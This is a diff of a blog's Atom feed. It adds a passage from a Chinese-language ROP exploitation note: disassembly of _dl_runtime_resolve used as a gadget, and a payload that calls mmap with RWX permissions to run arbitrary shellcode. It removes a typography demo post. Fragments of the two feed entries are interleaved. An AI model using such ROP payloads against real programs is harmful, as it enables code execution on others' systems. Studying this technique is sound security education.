+0x7ffff7def251 &amp;lt;_dl_runtime_resolve+81&amp;gt;:    mov     rcx,QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x8&lt;span class="o"&gt;]&lt;/span&gt;
+0x7ffff7def256 &amp;lt;_dl_runtime_resolve+86&amp;gt;:    mov     rax,QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp&lt;span class="o"&gt;]&lt;/span&gt;
+0x7ffff7def25a &amp;lt;_dl_runtime_resolve+90&amp;gt;:    add     rsp,0x48
+0x7ffff7def25e &amp;lt;_dl_runtime_resolve+94&amp;gt;:    jmp     r11
+&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;可以通过函数的PLT确定&lt;code&gt;_dl_runtime_resolve()&lt;/code&gt;地址, 其中&lt;code&gt;PLT[2]&lt;/code&gt;中跳转的地址就是&lt;code&gt;_dl_runtime_resolve()&lt;/code&gt;地址&lt;/li&gt;
+&lt;li&gt;要利用这个gadget, 我们还需要控制rax的值, 因为gadget是通过rax跳转的:&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x7ffff7def235 &amp;lt;_dl_runtime_resolve+53&amp;gt;:    mov    r11,rax
+...
+0x7ffff7def25e &amp;lt;_dl_runtime_resolve+94&amp;gt;:    jmp    r11
+&lt;/pre&gt;&lt;/div&gt;
 &lt;/li&gt;
-&lt;li&gt;把大象放进冰箱&lt;/li&gt;
-&lt;li&gt;关上冰箱&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2&gt;Horizontal rule&lt;/h2&gt;
-&lt;hr&gt;
-&lt;h2&gt;Math&lt;/h2&gt;
-&lt;p&gt;Inline Math: $m\times n$, math block:&lt;/p&gt;
-&lt;p&gt;$$C_{m\times k}=A_{m\times n}\cdot B_{n\times k}$$&lt;/p&gt;
-&lt;h2&gt;Figures&lt;/h2&gt;
-&lt;h3&gt;Single figure&lt;/h3&gt;
-&lt;p&gt;&lt;figure style="flex: 92.88888888888889" &gt;&lt;img width="836" height="450" src="https://cdn.jsdelivr.net/gh/yuriufo/yurisec.github.io@gh-pages/archives/assets/e0affbc80ccb2d596c87b520e37e7071.jpg" /&gt;&lt;figcaption&gt;Princess Mononoke&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h3&gt;Photoset&lt;/h3&gt;
-&lt;div class="photos"&gt;
-&lt;figure style="flex: 75.0" &gt;&lt;img width="4032" height="2688" src="https://cdn.jsdelivr.net/gh/yuriufo/yurisec.github.io@gh-pages/archives/assets/4956a144888cdbbb6c2df1d1d15384b0.jpeg" /&gt;&lt;/figure&gt;
-&lt;figure style="flex: 50.03720238095238" &gt;&lt;img width="2690" height="2688" src="https://cdn.jsdelivr.net/gh/yuriufo/yurisec.github.io@gh-pages/archives/assets/4c66f0da616b08325b3aaa4c8b3f68e1.jpg" /&gt;&lt;/figure&gt;
-&lt;figure style="flex: 75.0" &gt;&lt;img width="4032" height="2688" src="https://cdn.jsdelivr.net/gh/yuriufo/yurisec.github.io@gh-pages/archives/assets/8b4d2334469ffa39b59e6fdb37c8c601.jpeg" /&gt;&lt;/figure&gt;&lt;/div&gt;&lt;div class="photos"&gt;
-&lt;figure style="flex: 75.0" &gt;&lt;img width="4032" height="2688" src="https://cdn.jsdelivr.net/gh/yuriufo/yurisec.github.io@gh-pages/archives/assets/0f5023d542a33e7c9d270f3cd6a99562.jpeg" /&gt;&lt;/figure&gt;
-&lt;figure style="flex: 75.0" &gt;&lt;img width="4032" height="2688" src="https://cdn.jsdelivr.net/gh/yuriufo/yurisec.github.io@gh-pages/archives/assets/20ec69d2a0276336f95e11f42866d17f.jpeg" /&gt;&lt;/figure&gt;
-&lt;figure style="flex: 75.0" &gt;&lt;img width="4032" height="2688" src="https://cdn.jsdelivr.net/gh/yuriufo/yurisec.github.io@gh-pages/archives/assets/2b8af25285e5a193729a350593113bad.jpeg" /&gt;&lt;/figure&gt;&lt;/div&gt;&lt;h2&gt;Table&lt;/h2&gt;
-&lt;table&gt;
-&lt;thead&gt;&lt;tr&gt;
-&lt;th&gt;header&lt;/th&gt;
-&lt;th&gt;header&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;cell 1&lt;/td&gt;
-&lt;td&gt;cell 2&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;cell 3&lt;/td&gt;
-&lt;td&gt;cell 4&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h2&gt;Link Card&lt;/h2&gt;
-&lt;div class="links"&gt;
-&lt;a style="display:block" target="_blank" href="https://www.imalan.cn" class="board-item"&gt;                 &lt;div class="board-thumb"&gt;&lt;img src="https://secure.gravatar.com/avatar/1741a6eef5c824899e347e4afcbaa75d?s=200&amp;r=G&amp;d="&gt;&lt;/div&gt;                 &lt;div class="board-title"&gt;AlanDecode&lt;/div&gt;&lt;/a&gt;&lt;/div&gt;&lt;hr&gt;&lt;div class="footnotes"&gt;&lt;ol&gt;&lt;li id="fn_1"&gt;Home page for AlanDecode &lt;a no-style href="#fn_ref_1"&gt;↩&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;</content><link href="/archives/typography/" rel="alternate"/><published>2019-12-18T16:50:00+08:06</published></entry></feed>
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2&gt;利用mmap执行任意shellcode&lt;/h2&gt;
+&lt;p&gt;mmap或者mprotect将某块内存改成RWX, 然后将shellcode保存到这块内存, 然后控制pc跳转过去就可以执行任意的shellcode了.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)&lt;/span&gt;
+&lt;span class="c1"&gt;# 参数传递从linker_addr + 0x35开始&lt;/span&gt;
+&lt;span class="c1"&gt;# 需要先pop rax,ret,且使rax=mmap_addr&lt;/span&gt;
+&lt;span class="c1"&gt;# r9,r8,rdi,rsi,rdx,rcx,rax&lt;/span&gt;
+&lt;span class="c1"&gt;# 最后需要(0x48-8*6)/8 = 3Byte padding&lt;/span&gt;
+&lt;span class="n"&gt;payload3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;136&lt;/span&gt;
+&lt;span class="n"&gt;payload3&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pop_rax_ret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mmap_addr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;payload3&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;linker_addr&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x35&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode_addr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+</content><link href="/yuriufo-blog.github.io/archives/RopNote/" rel="alternate"/><published>2018-03-28T14:45:00+08:06</published></entry></feed>
